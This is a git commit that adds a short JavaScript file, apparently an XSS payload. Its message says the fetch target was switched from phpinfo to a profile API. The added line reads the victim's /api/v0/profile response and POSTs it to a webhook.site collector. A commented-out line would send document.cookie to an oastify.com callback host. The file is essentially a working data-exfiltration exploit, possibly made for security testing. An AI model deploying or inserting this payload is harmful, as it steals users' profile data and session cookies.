9370fb67d447ff281e91df76c5406652f7aa06b8
0xB0xB <37478611+0xB0xB@users.noreply.github.com>
2026-01-14 11:12:08 +0400

    Change fetch URL from phpinfo to profile API

---
+++ ex6.js
@@ -0,0 +1,3 @@
+fetch('/api/v0/profile').then(r=>r.text()).then(d=>fetch('https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d0470',{method:'POST',body:d}))
+
+//fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
